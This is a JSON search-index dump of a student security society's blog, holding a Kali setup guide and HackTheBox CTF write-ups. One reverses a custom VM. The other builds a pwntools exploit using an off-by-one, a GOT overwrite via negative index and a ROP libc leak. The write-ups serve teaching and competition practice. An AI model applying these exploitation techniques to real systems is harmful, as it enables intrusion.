[{"categories":["help"],"content":"A brief guide on getting a Virtual Environment created for ComSec sessions","date":"2023-08-30","objectID":"/posts/getting-setup/","tags":["writeup","help"],"title":"Getting setup for ComSec","uri":"/posts/getting-setup/"},{"categories":["help"],"content":"Most ComSec sessions are practical, so you’ll need a system you’re happy to hack on. We will run workshops in the labs as much as possible, so those machines will be available. If you’re a more experience hacker, you no doubt have your own environment, however, if you’re still getting into the area you may want a low-effort environment to start with. ComSec has built some tools to help with this. ","date":"2023-08-30","objectID":"/posts/getting-setup/:0:0","tags":["writeup","help"],"title":"Getting setup for ComSec","uri":"/posts/getting-setup/"},{"categories":["help"],"content":"ComSec Vagrant Setup For a completely hands-off approach to getting the latest Kali virtual machine and installing all the tools you’ll need for a standard ComSec session, this approach will suit you. Prerequisites: A Windows or Linux machine with: Superuser privileges VMWare Player/Workstation/Workstation Pro or Virtualbox, capable of running VMs Approx 60GB of disk space. A git client ","date":"2023-08-30","objectID":"/posts/getting-setup/:1:0","tags":["writeup","help"],"title":"Getting setup for ComSec","uri":"/posts/getting-setup/"},{"categories":["help"],"content":"Installing Vagrant Download the correct vagrant for your platform here If you’re using Virtualbox for virtualization, skip to the next stage If on VMWare, download the VMWare vagrant utility for your platform here and run it Install the vagrant plugin utility with the command vagrant plugin install vagrant-vmware-desktop Restart the machine ","date":"2023-08-30","objectID":"/posts/getting-setup/:1:1","tags":["writeup","help"],"title":"Getting setup for ComSec","uri":"/posts/getting-setup/"},{"categories":["help"],"content":"Setting up with Vagrant Clone the repository git clone https://github.com/Cov-ComSec/ComSec-Kali-Deploy.git Navigate into the directory of ComSec-Kali-Deploy Run vagrant box update Run vagrant up After a few seconds, you should see Virtualbox/VMWare open, and the terminal should begin outputting the results of installation. A successful installation will end with “Installation complete”. The virtual machine will then reboot. The credentials to login are kali:kali. ","date":"2023-08-30","objectID":"/posts/getting-setup/:1:2","tags":["writeup","help"],"title":"Getting setup for ComSec","uri":"/posts/getting-setup/"},{"categories":["Academic Year 2022-23"],"content":"Team writeups from the HackTheBox Cyber Apocalypse 2023","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"The HackTheBox Cyber Apocalypse has become a staple annual event of the ComSec CTF calendar, though this year a couple of changed were introduced - such as the maximum team size and average difficulty of the challenges. This post contains some challenges Contents\rContents\rrev: Alien Saboteur Understanding the VM Reversing the VM Program Getting the First Password Unravelling more Code Finding the Flag pwn: Control Room Static Analysis Configure Engine Exploitation ","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/:0:0","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"rev: Alien Saboteur Solved by Ben R, this was rated a medium difficulty challenge, and his personal favourite challenge in the CTF. 2 files could be downloaded, and there was no remote element. Running the program, it seems to be a classic ‘find the password’ style challenge. └─$ ./vm bin [Main Vessel Terminal] \u003c Enter keycode \u003e ","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/:1:0","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"Understanding the VM The two files were vm and bin. As the name suggests, the bin file was a binary blob, the vm file was an ELF. The main function program showed the binary blob being read into memory, and is then passed to the vm_create() function. Cleaning up the compilation as we go, we can see the vm_create function essentially allocates 2 areas of memory for the virtual machine, and an additional area for the vm metadata. I created a structure to represent the metadata structure, hopefully the members can be given better names as the reversing process continues. Note A little reverse engineering tip here - when trying to clean out some nasty compilation due to a custom structure or something, getting the size of the structure right is usually enough to significantly improve the readability. struct vm_meta* vm_create(int64_t blob_ptr, int64_t vm_size) struct vm_meta* vm_ptrs = malloc(bytes: 168) vm_ptrs-\u003efield_0 = 0 vm_ptrs-\u003efield_4.b = 0 vm_ptrs-\u003efield_a0 = 0 memset(\u0026vm_ptrs-\u003efield_8, 0, 128) vm_ptrs-\u003efield_90 = calloc(n: 0x10000, elem_size: 1) memcpy(vm_ptrs-\u003efield_90, blob_ptr + 3, vm_size - 3) vm_ptrs-\u003efield_98 = calloc(n: 0x200, elem_size: 4) return vm_ptrs With the virtual machine setup, vm_run() is called, one of the vm_meta structs members was identified as a boolean to indicate when to stop stepping through the vm code. bool vm_run(struct vm_meta* vm_ptrs) bool vm_running while (true) vm_running = vm_ptrs-\u003eis_running if (vm_running != 0) break vm_step(vm_ptrs) return vm_running The vm_step function was the first that looked pretty nasty, using pointer math and offsets to extract data out of the supplied argument and essentially use a crude method of dynamic dispatch to call the correct function based on an offset to a global variable (highlighted red). Cleaning that up, we can see that a byte of data is being read from an offset to the vm_code memory, and used to indicate which function should be executed in the operations table. The operations table points to all the operations that can be performed by the vm struct operations_table { void* vm_add; void* vm_addi; void* vm_sub; void* vm_subi; void* vm_mul; void* vm_muli; void* vm_div; void* vm_cmp; void* vm_jmp; void* vm_inv; void* vm_push; void* vm_pop; void* vm_mov; void* vm_nop; void* vm_exit; void* vm_print; void* vm_putc; void* vm_je; void* vm_jne; void* vm_jle; void* vm_jge; void* vm_xor; void* vm_store; void* vm_load; void* vm_input; }; ","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/:1:1","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"Reversing the VM Program It could be pointless to now go and reverse engineer all the operations, some of them may never be used. Looking at the bin file, we see the first three bytes are the file header, which don’t get memcpy’d into the code segment, and then an 0x10 byte which equates to the vm_putc function. └─$ xxd bin | head 00000000: 5577 5510 5b00 0000 0010 4d00 0000 0010 UwU.[.....M..... 00000010: 6100 0000 0010 6900 0000 0010 6e00 0000 a.....i.....n... 00000020: 0010 2000 0000 0010 5600 0000 0010 6500 .. .....V.....e. 00000030: 0000 0010 7300 0000 0010 7300 0000 0010 ....s.....s..... 00000040: 6500 0000 0010 6c00 0000 0010 2000 0000 e.....l..... ... 00000050: 0010 5400 0000 0010 6500 0000 0010 7200 ..T.....e.....r. 00000060: 0000 0010 6d00 0000 0010 6900 0000 0010 ....m.....i..... 00000070: 6e00 0000 0010 6100 0000 0010 6c00 0000 n.....a.....l... 00000080: 0010 5d00 0000 0010 0a00 0000 0010 3c00 ..]...........\u003c. 00000090: 0000 0010 2000 0000 0010 4500 0000 0010 .... .....E..... This function clearly shows that putc takes one argument, which is a 8-bit integer stored in the byte directly following the instruction. The penultimate statement in the function, where the instruction pointer is incremented by 6, hints that all instructions in this custom vm are 6 in total. struct vm_meta* vm_putc(struct vm_meta* vm_ptrs) putchar(c: zx.d(u8(zx.q(vm_ptrs-\u003einstruction_counter) + 1 + vm_ptrs-\u003ecode_section))) vm_ptrs-\u003einstruction_counter = vm_ptrs-\u003einstruction_counter + 6 return vm_ptrs Time to write some code to disassemble the binary blob. from pwn import * file_data = b\"\" instruction_counter = 0x0 def interpret_putc(): global file_data print(f\"{hex(instruction_counter)}: putc('{chr(file_data[1])}')\") def interpret_mov(): global file_data imm = file_data[1] addr = u32(file_data[2:4] + b\"\\x00\\x00\") print(f\"{hex(instruction_counter)}: MOV {hex(imm)} = {hex(addr)}\") def interpret_input(): global file_data addr = u32(file_data[1:3] + b\"\\x00\\x00\") print(f\"{hex(instruction_counter)}: INPUT: {hex(addr)}\") def interpret_store(): global file_data dest = file_data[1] src = file_data[2] print(f\"{hex(instruction_counter)}: STORE {hex(src)} -\u003e {hex(dest)}\") # print(f\"STORE {hex(src)} = {hex(dest)}\") def interpret_add(): global file_data a1 = file_data[1] a2 = file_data[2] a3 = file_data[3] print(f\"{hex(instruction_counter)}: ADD {hex(a1)} = {hex(a2)} + {hex(a3)}\") def interpret_jle(): global file_data cmp1 = file_data[1] cmp2 = file_data[2] jmp_addr = u16(file_data[3:5]) print(f\"{hex(instruction_counter)}: JLE {hex(jmp_addr)} IF {hex(cmp1)} \u003e {hex(cmp2)} \") def interpret_load(): global file_data src = file_data[1] dest = file_data[2] print(f\"{hex(instruction_counter)}: LOAD {hex(src)} \u003c- {hex(dest)}\") def interpret_xor(): global file_data dest = file_data[1] xor1 = file_data[2] xor2 = file_data[3] print(f\"{hex(instruction_counter)}: XOR {hex(dest)} = {hex(xor1)} ^ {hex(xor2)}\") def interpret_je(): global file_data cmp1 = file_data[1] cmp2 = file_data[2] jmp_addr = u16(file_data[3:5]) print(f\"{hex(instruction_counter)}: JE {hex(jmp_addr)} IF {hex(cmp1)} == {hex(cmp2)}\") def interpret_exit(): global file_data print(\"{hex(instruction_counter)}: VM EXIT\") def interpret_push(): global file_data data = file_data[1] print(f\"{hex(instruction_counter)}: PUSH {hex(data)}\") def interpret_inv(): global file_data data1 = file_data[1] data2 = file_data[2] print(f\"{hex(instruction_counter)}: INV {hex(data1)}, {hex(data2)}\") def interpret_multi(): global file_data dest = file_data[1] arg1 = file_data[2] arg2 = file_data[3] print(f\"{hex(instruction_counter)}: MULTI {hex(dest)} = {hex(arg1)} * {hex(arg2)}\") def interpret_instruction(): global file_data, instruction_counter opcode = file_data[0] match opcode: case 5: interpret_multi() case 0x1: interpret_add() case 0x10: interpret_putc() case 0x11: interpret_je() case 0x13: interpret_jle() case 0x9: interpret_inv() case 0xa: interpret_push() case 0xc: interpret_mov() case 0xe: interpret_exit() case 0x15: int","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/:1:2","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"Getting the First Password The first interesting part of the assembly, in terms of progression, is just after putc. The program take some user input, 1 byte at a time, for 18 bytes. After that, it iterates through memory, xoring each byte with 0xa9, and comparing the result to the user input, character by character. If the input doesn’t match, the program prints an error “unknown keycode” and exits, else it continues through the loop until every byte has been checked. 0x2a: MOV 0x1e = 0xfa0 0x2b: MOV 0x1c = 0x0 0x2c: MOV 0x1d = 0x11 0x2d: INPUT: 0x19 0x2e: STORE 0x19 -\u003e 0x1e 0x2f: ADD 0x1e = 0x1e + 0x1 0x30: ADD 0x1c = 0x1c + 0x1 0x31: JLE 0x2d IF 0x1c \u003e 0x1d 0x32: MOV 0x1e = 0x1004 0x33: MOV 0x1f = 0xfa0 0x34: MOV 0x1c = 0x0 0x35: MOV 0x1d = 0xa 0x36: MOV 0x1b = 0xa9 0x37: MOV 0x17 = 0x0 0x38: LOAD 0x19 \u003c- 0x1e 0x39: LOAD 0x18 \u003c- 0x1f 0x3a: XOR 0x19 = 0x19 ^ 0x1b 0x3b: JE 0x4e IF 0x19 == 0x18 0x3c: putc('U') 0x3d: putc('n') 0x3e: putc('k') 0x3f: putc('n') 0x40: putc('o') 0x41: putc('w') 0x42: putc('n') 0x43: putc(' ') 0x44: putc('k') 0x45: putc('e') 0x46: putc('y') 0x47: putc('c') 0x48: putc('o') 0x49: putc('d') 0x4a: putc('e') 0x4b: putc('!') 0x4c: putc(' ') 0x4d: VM EXIT 0x4e: ADD 0x1e = 0x1e + 0x1 0x4f: ADD 0x1f = 0x1f + 0x1 0x50: ADD 0x1c = 0x1c + 0x1 0x51: JLE 0x38 IF 0x1c \u003e 0x1d From the disassembly, we can see the user input is at 0xfa0 (4000), the encoded string is at 0x1004 (4100), and the encoded string is xor’d with the constant value 0xa9 (169). So we can manually pull that data out and do the xor, since xor is reversible we will get a string that, when inputted, will pass the character checks. In [1]: code = \"\" ...: with open(\"bin\", \"rb\") as f: ...: encoded_string = f.read()[0x1004 + 3:0x1004+ 3 + 11] ...: for char in encoded_string: ...: code += chr(char ^ 0xa9) ...: code Out[1]: 'c0d3_r3d_5h' I think this was actually meant to be a comparison of the full 17 expected bytes, which would have given the string c0d3_r3d_5hutd0wn, but c0d3_r3d_5h actually works fine, by just appending random characters to the end. The next chunk of assembly basically does a sort of “am I being debugged” check. The program exits if it detects this. 0x4e: ADD 0x1e = 0x1e + 0x1 0x4f: ADD 0x1f = 0x1f + 0x1 0x50: ADD 0x1c = 0x1c + 0x1 0x51: JLE 0x38 IF 0x1c \u003e 0x1d 0x52: MOV 0xf = 0x0 0x53: PUSH 0xf 0x54: PUSH 0xf 0x55: PUSH 0xf 0x56: INV 0x65, 0x3 0x57: MOV 0x10 = 0x0 0x58: JE 0x6c IF 0x1f == 0x10 0x59: putc('T') 0x5a: putc('e') 0x5b: putc('r') 0x5c: putc('m') 0x5d: putc('i') 0x5e: putc('n') 0x5f: putc('a') 0x60: putc('l') 0x61: putc(' ') 0x62: putc('b') 0x63: putc('l') 0x64: putc('o') 0x65: putc('c') 0x66: putc('k') 0x67: putc('e') 0x68: putc('d') 0x69: putc('!') 0x6a: putc(' ') This can be overcome simply by patching out the syscall instruction - though we don’t need to do that as we’re solving the challenge entirely statically. ","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/:1:3","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"Unravelling more Code The program now prompts for a ‘secret phrase’. Strange thing here is that there is only slightly more code remaining from our assembly dump, and it doesn’t include printing the prompt… 0x6c: MOV 0x1e = 0x77 0x6d: MULTI 0x1e = 0x1e * 0x6 0x6e: MOV 0x1c = 0x0 0x6f: MOV 0x1d = 0x5dc 0x70: MOV 0x1b = 0x45 0x71: LOAD 0x19 \u003c- 0x1e 0x72: XOR 0x19 = 0x19 ^ 0x1b 0x73: STORE 0x19 -\u003e 0x1e 0x74: ADD 0x1e = 0x1e + 0x1 0x75: ADD 0x1c = 0x1c + 0x1 0x76: JLE 0x71 IF 0x1c \u003e 0x1d This is because parts of the program have been scrambled as well, using xor. So, starting from 0x77 (the next instruction after the JLE), the program will xor 1500 bytes of data with the constant value 0x45. We can reverse this operation too. In [10]: code = bytearray(b\"UwU\") ...: with open(\"bin\", \"rb\") as f: ...: encoded_string = f.read()[0x77 + 3:0x77+ 3 + 1500] ...: for char in encoded_string: ...: code.append(char ^ 0x45) ...: with open(\"part2_bin\", \"wb\") as f: ...: f.write(code) Also needed to update the disassembling script here, to handle some additional operations and also add functionality for the user to specify a file to disassemble. from pwn import * import sys file_data = b\"\" instruction_counter = int(sys.argv[2], 16) def interpret_putc(): global file_data print(f\"{hex(instruction_counter)}: putc('{chr(file_data[1])}')\") def interpret_mov(): global file_data imm = file_data[1] addr = u32(file_data[2:4] + b\"\\x00\\x00\") print(f\"{hex(instruction_counter)}: MOV {hex(imm)} = {hex(addr)}\") def interpret_input(): global file_data addr = u32(file_data[1:3] + b\"\\x00\\x00\") print(f\"{hex(instruction_counter)}: INPUT: {hex(addr)}\") def interpret_store(): global file_data dest = file_data[1] src = file_data[2] print(f\"{hex(instruction_counter)}: STORE {hex(src)} -\u003e {hex(dest)}\") def interpret_add(): global file_data a1 = file_data[1] a2 = file_data[2] a3 = file_data[3] print(f\"{hex(instruction_counter)}: ADD {hex(a1)} = {hex(a2)} + {hex(a3)}\") def interpret_jle(): global file_data cmp1 = file_data[1] cmp2 = file_data[2] jmp_addr = u16(file_data[3:5]) print(f\"{hex(instruction_counter)}: JLE {hex(jmp_addr)} IF {hex(cmp1)} \u003e {hex(cmp2)} \") def interpret_load(): global file_data src = file_data[1] dest = file_data[2] print(f\"{hex(instruction_counter)}: LOAD {hex(src)} \u003c- {hex(dest)}\") def interpret_xor(): global file_data dest = file_data[1] xor1 = file_data[2] xor2 = file_data[3] print(f\"{hex(instruction_counter)}: XOR {hex(dest)} = {hex(xor1)} ^ {hex(xor2)}\") def interpret_je(): global file_data cmp1 = file_data[1] cmp2 = file_data[2] jmp_addr = u16(file_data[3:5]) print(f\"{hex(instruction_counter)}: JE {hex(jmp_addr)} IF {hex(cmp1)} == {hex(cmp2)}\") def interpret_exit(): global file_data print(f\"{hex(instruction_counter)}: VM EXIT\") def interpret_push(): global file_data data = file_data[1] print(f\"{hex(instruction_counter)}: PUSH {hex(data)}\") def interpret_pop(): global file_data data = file_data[1] print(f\"{hex(instruction_counter)}: POP {hex(data)}\") def interpret_add(): global file_data arg1 = file_data[1] arg2 = file_data[2] arg3 = file_data[3] print(f\"{hex(instruction_counter)}: ADD: {hex(arg1)} = {hex(arg2)} + {hex(arg3)}\") def interpret_inv(): global file_data data1 = file_data[1] data2 = file_data[2] print(f\"{hex(instruction_counter)}: INV {hex(data1)}, {hex(data2)}\") def interpret_multi(): global file_data dest = file_data[1] arg1 = file_data[2] arg2 = file_data[3] print(f\"{hex(instruction_counter)}: MULTI {hex(dest)} = {hex(arg1)} * {hex(arg2)}\") def interpret_instruction(): global file_data, instruction_counter opcode = file_data[0] match opcode: case 0: interpret_add() case 5: interpret_multi() case 0x1: interpret_add() case 0xb: interpret_pop() case 0x10: interpret_putc() case 0x11: interpret_je() case 0x13: interpret_jle() case 0x9: interpret_inv() case 0xa: interpret_push() case 0xc: interpret_mov() case 0xe: interpret_exit() case 0x15: interpret_xor() case 0x16: interpret_store() case 0x17: interpret_load() case 0x18: interpret_inpu","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/:1:4","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"Finding the Flag What’s happening here, is that user input is entered and then undergoes two mangling operations, it looks complicated but its essentially a loop with two inner loops. Swap the character with a position defined in a swap table at 0x1130 (4500) Mangle the input with an xor operation, the value of which is an xor table at 0x11f8 (4600) Once the mangling has taken place, the mangled input is compared with 35 bytes starting from address 0x125c (4700). So we need to extract the following from the binary blob: The swap table, 36 bytes starting at 0x1130 The xor table, 36 bytes starting at 0x11f8 The comparison string, 36 bytes starting at 0x125c After extracting the swap table, xor table, and the comparison string, we can reverse the mangling and get the expected input. Obviously as we’re doing the inverse operation, we need to xor and then swap rather than swap and then xor. In [104]: with open(\"bin\", \"rb\") as f: ...: data = f.read()[3:] ...: flag = bytearray(data[4700:4700+36]) ...: xor_table = bytearray(data[4600:4600+36]) ...: swap_table = bytearray(data[4500:4500+36]) ...: ...: for i in range(35,-1,-1): ...: for j in range(36): ...: flag[j] = flag[j] ^ xor_table[i] ...: ...: for j in range(35,-1,-1): ...: tmp = flag[swap_table[j]] ...: flag[swap_table[j]] = flag[j] ...: flag[j] = tmp ...: flag.decode() Out[104]: 'HTB{5w1rl_4r0und_7h3_4l13n_l4ngu4g3}' We got the flag! HTB{5w1rl_4r0und_7h3_4l13n_l4ngu4g3} ","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/:1:5","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"pwn: Control Room Control room was a hard rated pwn challenge, solved by Ben R. Like most pwn challenges, we were given the target binary and the relevant LIBC, and a remote server to run the final exploit to grab the flag. └─$ ./control_room \u003c===[ Register ]===\u003e Enter a username: sharkmoos Are you sure about your username choice? (y/n) \u003e n \u003c===[ Edit Username ]===\u003e New username size: 7 Enter your new username: shark [+] User updated successfully! ┌───────────────┬────────┐ │ Control Panel │ 9A0:F3 │ ├───────────────┴────────┤ │ │ │ Technician: │ │ │ │ 1. Configure Engine │ │ │ │ 2. Check Engine │ │ │ │ Captain: │ │ │ │ 3. Set route │ │ │ │ 4. View route │ │ │ │ 5. Change roles │ │ │ └────────────────────────┘ [*] Current Role: Crew Option [1-5]: ","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/:2:0","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"Static Analysis The challenge binary had quite a few functions, compared to your standard pwn challenge, and a bunch of functions were irrelevant for my exploit, so I’ll just list most of the functions. register_user: Allows the user to register a username. The username, username length, and role are stored in a heap chunk, and a pointer to the chunk is stored in a global variable curr_user. The role is a single byte variable, 1=Technician, 0=Captain, 2=Crew. edit_user: Allows us to change the username, the program checks the size of the new username is not longer than the old username, but there is an off-by-one error allowing us to overwrite the role byte, so we can become the captain change_role: Allows the captain to change his role. view_route: Allows us to view the route, which is a global variable made up of 4 lots of 2 int64_t values, to represent latitude and longitude. change_route: A person with the captain role can set a route, which is a global variable made up of 4 lots of 2 int64_t values, to represent latitude and longitude. There was actually an UDA (uninitialised data access) here, when reading the data from the stack to the global variable, so if the user entered no data, some stack data would get copied into the global buffer and could be leaked using view_route. check_engines: A person with the technician role can check the engines, which is a global variable made up of 4 lots of two int64_t values, representing thrust and mix_ratio. This function just checked the values were within a valid range and would log an error if not. I don’t think there was anything challenge relevent here. configure_engine: A person with the technician role can configure the engines, this is the juicy one that we will discuss more. ","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/:2:1","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"Configure Engine configure_engine() lets a technician select one of the 4 engines, and then supply values for thrust and mix_ratio. The values are stored in a global variable, in a variable I called engines. The code for configure_engine() looked pretty nasty at first. int64_t configure_engine() void* fsbase int64_t rax = *(fsbase + 0x28) int16_t var_13 = 0 char var_11 = 0 int32_t var_2c = 0 if (*(curr_user + 0x100) != 1) log_message(3, \"Only technicians are allowed to …\") else printf(format: \"\\nEngine number [0-%d]: \", 3) int32_t rax_5 = read_num() int64_t var_28 int64_t var_20 if (rax_5 s\u003c= 3) printf(format: \"Engine [%d]: \\n\", zx.q(rax_5)) printf(format: \"\\tThrust: \") __isoc99_scanf(format: \u0026data_40330e, \u0026var_28) printf(format: \"\\tMixture ratio: \") __isoc99_scanf(format: \u0026data_40330e, \u0026var_20) getchar() printf(format: \"\\nDo you want to save the config…\") printf(format: \u0026data_403347) fgets(buf: \u0026var_13, n: 3, fp: stdin) *(\u0026var_13 + strcspn(\u0026var_13, \u0026data_4030a2)) = 0 if (strcmp(\u0026var_13, \u0026data_40334b) == 0) int64_t rdx_3 = var_20 *((sx.q(rax_5) \u003c\u003c 4) + \u0026engines) = var_28 *((sx.q(rax_5) \u003c\u003c 4) + \u0026data_405128) = rdx_3 log_message(0, \"Engine configuration updated suc…\") else log_message(1, \"Engine configuration cancelled.\\n\") int64_t rax_21 = rax ^ *(fsbase + 0x28) if (rax_21 == 0) return rax_21 __stack_chk_fail() noreturn This just because original code would have used structures for the engines, so recreating those structures makes the code much more readable. int64_t configure_engine() void* fsbase int64_t rax = *(fsbase + 0x28) int16_t confirm = 0 char var_11 = 0 int32_t var_2c = 0 if (*(curr_user + 0x100) != 1) log_message(log_level: 3, message: \"Only technicians are allowed to …\") else printf(format: \"\\nEngine number [0-%d]: \", 3) int32_t engine_index = read_num() struct engine engine if (engine_index s\u003c= 3) printf(format: \"Engine [%d]: \\n\", zx.q(engine_index)) printf(format: \"\\tThrust: \") __isoc99_scanf(format: \u0026_%l, \u0026engine) printf(format: \"\\tMixture ratio: \") __isoc99_scanf(format: \u0026_%l, \u0026engine.mix_ratio) getchar() printf(format: \"\\nDo you want to save the config…\") printf(format: \u0026_\u003e) fgets(buf: \u0026confirm, n: 3, fp: stdin) *(\u0026confirm + strcspn(\u0026confirm, \u0026_\\n)) = 0 if (strcmp(\u0026confirm, \u0026y) == 0) int64_t ratio_1 = engine.mix_ratio *((sx.q(engine_index) \u003c\u003c 4) + \u0026engines) = engine.thrust (\u0026engines.engine_0.mix_ratio)[sx.q(engine_index) * 2] = ratio_1 log_message(log_level: 0, message: \"Engine configuration updated suc…\") else log_message(log_level: 1, message: \"Engine configuration cancelled.\\n\") int64_t rax_20 = rax ^ *(fsbase + 0x28) if (rax_20 == 0) return rax_20 __stack_chk_fail() noreturn The bug here, is that the engine_index has a signed comparison, so by entering a negative number it will pass the check and allow us to write into memory at offsets above the engines variable in memory. Since this is in global memory, the Global Offset Table (GOT) is located here. So we have a GOT overwrite primitive via OOB write. An additional constraint of this is that two values must be written, so this forced an overwrite for 2 adjacent GOT entries. Most times the impact of this could be reduced by just overwriting the other entry with a ret gadget. Now, we need to find a candidate to be overwritten, that will create a useful primitive for us. Since we have no LIBC leak, and system or other code-exec functions have not been used, we can only work with what already exists in the program. GOT protection: Partial RELRO | GOT functions: 20 [0x405018] free@GLIBC_2.2.5 -\u003e 0x401030 ◂— endbr64 [0x405020] strncpy@GLIBC_2.2.5 -\u003e 0x401040 ◂— endbr64 [0x405028] puts@GLIBC_2.2.5 -\u003e 0x7f64df83ded0 (puts) ◂— endbr64 [0x405030] fread@GLIBC_2.2.5 -\u003e 0x7f64df83cbb0 (fread) ◂— endbr64 [0x405038] fclose@GLIBC_2.2.5 -\u003e 0x7f64df83bcf0 (fclose@@GLIBC_2.2.5) ◂— endbr64 [0x405040] strlen@GLIBC_2.2.5 -\u003e 0x401080 ◂— endbr64 [0x405048] __stack_chk_fail@GLIBC_2.4 -\u003e 0x401090 ◂— endbr64 [0x405050] printf@GLIBC_2.2.5 -\u003e 0x7f64df81d770 (printf) ◂— endbr64 [0x405","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/:3:0","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"Exploitation After quite a while looking the functions, what arguments are supplied, whether they’re used in places that would break the program before I could exploit it. This was quite tricky, as the data out (fgets, scanf etc) functions all have quite complex function arguments that couldn’t be fulfilled in other functions, such as fgets needing a pointer to stdin as the third argument. I found a candidate eventually. Still in the configure_engine function, there is a strcmp() on the confirm local variable, with the comparison character of y. When overwritten with the program defined function read_input, which takes arguments char *buf, int size, this essentially forces a buffer overflow in the confirm variable, which is 2 bytes long, with the y character which essentially becomes the size 79, neat right! So strcmp(\u0026confirm, \u0026y) becomes read_input(confirm, 79), which is a large buffer overflow. Plan of attack seems… simples! Create a user, fill the buffer to the largest allowed size. Edit the user, exploit the off-by-one to overwrite the role variable with 0 and become the captain role. Change role to technician using the change_role function. Configure the engines, and overwrite the GOT strcmp with read_input to get a buffer overflow. Use the buffer overflow to do a ret2libc Profit Note Turns out this wasn’t actually the intended method. The player was supposed to use the UDA to leak LIBC, and then overwrite atoi with system, then just supply sh to input that gets passed to atoi. My way is more fun tho :D Hmm, so that didn’t work - we can see what’s happened. The memset() in the read_input function has caused the exploit to crash… Well - who even needs initialised memory buffers anyway! Let’s just overwrite the GOT entry for memset with a ret gadget, and the adjacent printf with puts.plt. Close, but no cigar… Since the program has a stack canary mitigation, it is calling __stack_chk_fail and aborting before we can hijack execution. Well - let’s just overwrite the GOT entry for __stack_chk_fail with a ret gadget, and the adjacent strlen() with a ret too. This time it worked! We leaked libc using a ret2plt rop chain, and returned to the configure_engine function for a second round. With LIBC, exploitation is trivial. Exploit code below. from pwn import * IP, PORT = \"161.35.168.118\" ,31978 elf = ELF(\"./control_room_patched\", checksec=False) libc = ELF(\"./libc.so.6\", checksec=False) context.binary = elf # context.log_level = \"debug\" context.terminal = ['tmux', 'splitw', '-h'] gs = ''' continue ''' def conn(): if args.REMOTE: r = remote(IP, PORT) elif args.LOCAL: r = process([elf.path]) elif args.GDB: r = gdb.debug([elf.path], gdbscript=gs) else: r = process([elf.path], level=\"WARNING\") return r with conn() as p: rop = ROP(elf) ret = rop.find_gadget([\"ret\"]).address username = b\"A\" * (0x100) p.sendlineafter(b\": \", username) p.sendlineafter(b\": \", str(0x100).encode()) p.sendlineafter(b\":\", b\"B\" * (0x100 - 8)) # change role to technician p.sendlineafter(b\": \", b\"5\") p.sendlineafter(b\": \", b\"1\") # overwrite stack_check_fail p.sendlineafter(b\": \", b\"1\") p.sendlineafter(b\": \", b\"-14\") p.sendlineafter(b\": \", str(ret).encode()) p.sendlineafter(b\": \", str(ret).encode()) p.sendlineafter(b\"\u003e\", b\"y\") # overwrite memset cos it keeps crashing p.sendlineafter(b\": \", b\"1\") p.sendlineafter(b\": \", b\"-13\") p.sendlineafter(b\": \", str(elf.plt.puts).encode()) p.sendlineafter(b\": \", str(ret).encode()) p.sendlineafter(b\"\u003e\", b\"y\") # make strcmp a buffer overflow p.sendlineafter(b\": \", b\"1\") p.sendlineafter(b\": \", b\"-11\") p.sendlineafter(b\": \", str(elf.sym.read_input).encode()) p.sendlineafter(b\": \", str(elf.plt.puts).encode()) p.sendlineafter(b\"\u003e\", b\"y\") # trigger overflow p.sendlineafter(b\": \", b\"1\") p.sendlineafter(b\": \", b\"1\") p.sendlineafter(b\": \", b\"1\") p.sendlineafter(b\": \", b\"1\") rop.puts(elf.got.puts) rop.call(0x401db2) payload = flat({ 19: rop.chain() }) p.sendlineafter(b\"\u003e \", payload) p.recvline() p.recvline() p.recvline() leak = u64(p.recvl","date":"2023-03-23","objectID":"/posts/2023_hackthebox_cyberapoc/:4:0","tags":["htb","ctf","writeup"],"title":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","uri":"/posts/2023_hackthebox_cyberapoc/"},{"categories":["Academic Year 2022-23"],"content":"Writeups 